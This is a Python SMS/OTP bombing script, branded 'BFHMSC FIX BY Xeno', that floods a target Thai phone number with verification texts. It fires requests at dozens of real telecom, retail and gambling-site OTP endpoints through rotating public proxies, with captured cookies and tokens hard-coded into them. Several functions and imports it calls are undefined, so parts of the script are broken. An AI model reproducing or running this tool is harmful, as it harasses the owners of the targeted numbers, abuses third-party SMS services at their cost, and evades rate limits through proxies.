import datetime
import itertools
import os
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from re import search

import gratient
import requests
from httpx import get
from pystyle import Anime, Center, Colorate, Colors, System, Write
from requests import Session, get
from user_agent import generate_user_agent
os .system ("cls & title BFHMSC FIX BY XENO")
def now():
    now = datetime.now()
    nownow = now.strftime("%H:%M:%S")
    return nownow
os .system ("BFHMSC SMS FIX BY Xeno")
banner = r"""
██╗  ██╗███████╗███╗   ██╗
╚██╗██╔╝██╔════╝████╗  ██║
 ╚███╔╝ █████╗  ██╔██╗ ██║
 ██╔██╗ ██╔══╝  ██║╚██╗██║
██╔╝ ██╗███████╗██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
╔══════════════════════════╗
║     BFHMSC FIX BY Xeno   ║
║     linktr.ee/Xeno_miss  ║
╚══════════════════════════╝
[+] Enter
"""

def rb(text):
        return (Colorate.Horizontal(Colors.rainbow,text))

System.Size(120, 30) 

Anime.Fade(Center.Center(banner), Colors.blue_to_cyan, Colorate.Vertical, enter=True)


colorsPool = itertools.cycle([27, 33, 69, 74, 74, 73, 73, 73, 78, 114, 114, 113, 113, 155, 155, 155, 155, 155, 155, 191, 191, 185, 185, 185, 185, 185, 185, 221, 221, 221, 221, 221, 215, 215, 215, 209, 209, 209, 203, 203, 203, 204, 204, 204, 198, 198, 129, 129, 135, 99, 99, 99, 99, 63, 63, 63, 63, 69, 69, 69])
def printx(input):print('[\x1b[38;5;%sm%s\x1b[0m] %s' % (next(colorsPool), datetime.datetime.now().strftime('%H:%M:%S'), input))

threading = ThreadPoolExecutor(max_workers=int(100000000))
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"      
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()

os .system ("cls & title BFHMSC FIX BY XENO")
def now():
    now = datetime.now()
    nownow = now.strftime("%H:%M:%S")
    return nownow


format_one = 0
format_two = 0
format_tre = 0

loop_types = 1

def receive_color():
    global format_one, format_two, format_tre, loop_types

    for types1, types2, types3, number in zip([1, 0], [0, 1], ['+', '-'], [255, 0]):
        if (loop_types == types1):
            if (format_one != number):
                exec(f'format_one {types3}= 15', globals())

            if (format_one == number) and (format_two != number):
                exec(f'format_two {types3}= 15', globals())

            if (format_two == number) and (format_tre != number):
                exec(f'format_tre {types3}= 15', globals())

            if (format_tre == number):
                loop_types = types2

    return f"\033[38;2;{format_one};{format_two};{format_tre}m"
def bfhmsc():
    console.print("""
    ██╗  ██╗███████╗███╗   ██╗
    ╚██╗██╔╝██╔════╝████╗  ██║
     ╚███╔╝ █████╗  ██╔██╗ ██║
     ██╔██╗ ██╔══╝  ██║╚██╗██║
    ██╔╝ ██╗███████╗██║ ╚████║
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
    ╔══════════════════════════╗
    ║     BFHMSC FIX BY Xeno   ║
    ║     linktr.ee/Xeno_miss  ║
    ╚══════════════════════════╝
    """)

    phone = Prompt.ask("[+] Phone: ", default="")

    # Validate phone number length
    if not (len(phone) == 9):  # Assuming phone number is 9 digits
        console.print('[ERROR] PHONE NUMBER ERROR [ ! ]', style='bold red')
        time.sleep(1)
        os.system('clear')
        return

    amount = Prompt.ask("\n[+] Time: ", default="")

    # Call the API functions
    try:
        amount = int(amount)
        for _ in range(amount):  # Assuming you want to call the API 'amount' times
            bfhmscapi(phone)
    except ValueError:
        console.print('[ERROR] Invalid input for time.', style='bold red')


def send_request(api_url, phone, data=None, json=None):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
        }
        proxies = {'http': 'http://' + random.choice(s)}

        if json:
            r = requests.post(api_url, json=json, headers=headers, proxies=proxies)
        else:
            r = requests.post(api_url, data=data, headers=headers, proxies=proxies)

        if r.status_code in [200, 201]:
            printx(f"DDOS SPAM API TO {phone} SUCCESS")
        else:
            printx(f"Failed to send to {phone}. Status Code: {r.status_code}")

    except Exception as e:
        printx(f"An error occurred: {str(e)}", style='bold red')


def bfhmscapi(phone):
    api_endpoints = [
        ("https://store.truecorp.co.th/api/true/wportal/otp/request", {"mobile_number": phone}),
        ("https://openapi.bigc.co.th/customer/v1/otp", {"phone_no": phone}),
        ("https://lb-api.fox83-sy.xyz/api/otp/register", {"applicant": phone, "serviceName": "fox888.com"}),
        ("https://topping.truemoveh.com/api/get_request_otp", f"mobile_number={phone}"),
        ("https://api2.1112.com/api/v1/otp/create", {"phonenumber": phone, "language": "th"}),
        ("https://api-sso.ch3plus.com/user/request-otp", {"tel": phone, "type": "login"}),
        ("https://www.vegas77slots.com/auth/send_otp", f"phone={phone}"),
        ("https://service-api.auto1.co.th/w/user/request-otp-on-register", {"Tel": phone}),
        ("https://cognito-idp.ap-southeast-1.amazonaws.com/", {"ClientId": "6g47av6ddfcvi06v4l186c16d6", "Username": f"+66{phone[1:]}"}),
        ("https://kamuishop.online/kamuiapi/phone/", None),
        ("https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}", None),
        ("https://app.iship.cloud/api/ant/request-otp/{phone}", None),
        ("https://m-api.hhh-st1.xyz/api/otp/register", {"applicant": phone, "serviceName": "hihuay.com"}),
        ("https://www.beauticool.com/?m=request_otp", f"tel={phone}")
    ]

    for api_url, data in api_endpoints:
        send_request(api_url, phone, data=data if isinstance(data, str) else None, json=data if isinstance(data, dict) else None)


if __name__ == "__main__":
    bfhmsc()
def bfhmscapi15(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.put(f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"method":"register"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi16(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.giztix.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},json={"operationName":"OtpGeneratePhone","variables":{"phone":f"66{phone[1:]}"},"query":"mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi17(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi18(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://mapi.dung919.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"dung919.com"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi19(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.cmtrade.com/api/v2/account/sms/code",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "utm_source=GoogleSEM3; _ga=GA1.2.217747635.1664304861; _gac_UA-204031796-1=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gid=GA1.2.2032034977.1664304861; _gat_gtag_UA_204031796_1=1; _gac_UA-204031796-2=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gat_gtag_UA_204031796_2=1; _ga_39RBNN0V78=GS1.1.1664304861.1.0.1664304862.0.0.00","content-type": "application/x-www-form-urlencoded; charset=UTF-8","accept": "application/json, text/javascript, */*; q=0.01"},data=f"phone={phone}&countryCode=66&countryId=Thailand&type=mobile",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi20(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapicall21(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://1ufa.bet/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36","Content-Type": "application/x-www-form-urlencoded","cookie": "_gid=GA1.2.1736081460.1679951032; PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk; _raw_ref=https%3A%2F%2F1ufa.bet%2F; _ga=GA1.2.1166363420.1679951032; _ga_5148MHRV47=GS1.1.1679951031.1.1.1679952029.0.0.0"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi22(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi23(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = get(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi24(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")


def bfhmscapi25(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi26(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi27(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone",json={"phoneNumber":"+66"+phone},headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi28(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi29(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi30(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',headers={"accept": "application/json, text/javascript, */*; q=0.01","x-requested-with": "XMLHttpRequest","user-agent": generate_user_agent(),"cookie": "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi31(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	session = Session()
	ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
	r = session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi32(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.tgfone.com/signin/verifylforgot",headers={"user-agent": generate_user_agent(),"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"},data=f"forgot_name={phone}",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")

def bfhmscapi33(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=header,proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"DDOS SPAM API TO {phone} SUCSESS")
		
def BFHMSCAPI(phone, amount):
	for i in range(amount+1):
		threading.submit(bfhmscapi1, phone)
		threading.submit(bfhmscapi2, phone)
		threading.submit(bfhmscapi3, phone)
		threading.submit(bfhmscapi4, phone)
		threading.submit(bfhmscapi5, phone)
		threading.submit(bfhmscapi6, phone)
		threading.submit(bfhmscapi7, phone)
		threading.submit(bfhmscapi8, phone)
		threading.submit(bfhmscapi9, phone)
		threading.submit(bfhmscapi10, phone)
		threading.submit(bfhmscapi11, phone)
		threading.submit(bfhmscapi12, phone)
		threading.submit(bfhmscapi13, phone)
		threading.submit(bfhmscapi14, phone)
		threading.submit(bfhmscapi15, phone)
		threading.submit(bfhmscapi16, phone)
		threading.submit(bfhmscapi17, phone)
		threading.submit(bfhmscapi18, phone)
		threading.submit(bfhmscapi19, phone)
		threading.submit(bfhmscapi20, phone)
		threading.submit(bfhmscapicall21, phone)
		threading.submit(bfhmscapi22, phone)
		threading.submit(bfhmscapi23, phone)
		threading.submit(bfhmscapi24, phone)
		threading.submit(bfhmscapi25, phone)
		threading.submit(bfhmscapi26, phone)
		threading.submit(bfhmscapi27, phone)
		threading.submit(bfhmscapi28, phone)
		threading.submit(bfhmscapi29, phone)
		threading.submit(bfhmscapi30, phone)
		threading.submit(bfhmscapi31, phone)
		threading.submit(bfhmscapi32, phone)
		threading.submit(bfhmscapi33, phone)

BFHMSC()
